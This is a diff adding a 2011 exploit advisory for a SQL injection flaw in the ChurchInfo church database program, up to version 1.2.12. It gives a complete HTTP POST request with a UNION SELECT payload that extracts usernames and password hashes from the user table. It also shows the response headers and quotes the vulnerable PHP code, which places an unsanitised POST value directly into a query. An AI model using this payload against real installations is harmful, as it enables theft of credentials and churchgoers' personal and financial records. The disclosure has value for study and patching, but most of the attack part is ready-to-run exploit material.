@@ -1,0 +1,86 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2011-01-01                              ]
+ ##############################################################
+ #  [ ChurchInfo <= 1.2.12 ]  SQL Injection Vulnerability     #
+ ##############################################################
+ #
+ # Script: "ChurchInfo is a free church database program to help churches track members, 
+ #	    families, groups, pledges and payments..."
+ #
+ # Script site: http://www.churchdb.org/
+ # Download: http://sourceforge.net/projects/churchinfo/
+ #
+ # [SQL] Vuln: http://site.com/churchinfo-1.2.12/ListEvents.php
+ # 
+ #  POST /churchinfo-1.2.12/ListEvents.php HTTP/1.1
+ #  Host: site.com
+ #  User-Agent: Mozilla/5.0
+ #  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ #  Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ #  Accept-Encoding: gzip,deflate
+ #  Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+ #  Keep-Alive: 115
+ #  Connection: keep-alive
+ #  Cookie: d4dad6935f632ac35975e3001dc7bbe8=49c5739b193271a0005a59b294a05da9; PHPSESSID=8aec7c6adbe96b4079c0150b3c54452a
+ #  Content-Type: application/x-www-form-urlencoded
+ #  Content-Length: 150
+ #   
+ #  WhichType=-1/**/UNION/**/SELECT/**/1,concat_ws(char(58),usr_per_ID,usr_UserName,usr_Password),3,4,5,6,7,8/**/from/**/user_usr/**/WHERE/**/usr_per_ID=1
+ #   
+ #  HTTP/1.1 200 OK
+ #  Date: Sat, 01 Jan 2011 15:39:10 GMT
+ #  Server: Apache
+ #  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+ #  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+ #  Pragma: no-cache
+ #  X-Powered-By: PHP/4.4.9
+ #  Keep-Alive: timeout=2, max=200
+ #  Connection: Keep-Alive
+ #  Transfer-Encoding: chunked
+ #  Content-Type: text/html
+ #    
+ #    
+ # Bug: ./churchinfo-1.2.12/ListEvents.php (lines: 29-48)
+ #
+ # ...
+ # require 'Include/Config.php';
+ # require 'Include/Functions.php';                             // (0) You should be logged in as some user
+ # $eType="All";
+ # $ThisYear=date("Y");
+ # 
+ # if ($_POST['WhichType']){
+ #   $eType = $_POST['WhichType'];                              // (1)
+ # } else {
+ #   $eType ="All";
+ # }
+ # 
+ # if($eType!="All"){
+ #   $sSQL = "SELECT * FROM event_types WHERE type_id=$eType";  // (2)
+ #   $rsOpps = RunQuery($sSQL);
+ #   $aRow = mysql_fetch_array($rsOpps, MYSQL_BOTH);
+ #   extract($aRow);
+ #   $sPageTitle = "Listing Events of Type = ".$type_name;      // (3)
+ # } else {
+ #   $sPageTitle = gettext("Listing All Church Events");
+ # }
+ # ...  
+ #
+ #
+ # Bug: ./churchinfo-1.2.12/Include/Header-function.php (line: 37)
+ # 
+ # ...  
+ #    <title>ChurchInfo: <?php echo $sPageTitle; ?></title>     // (4) 
+ # ...  
+ # 
+ ###############################################
+
+ 
+ [ dun / 2011 ]
+ 
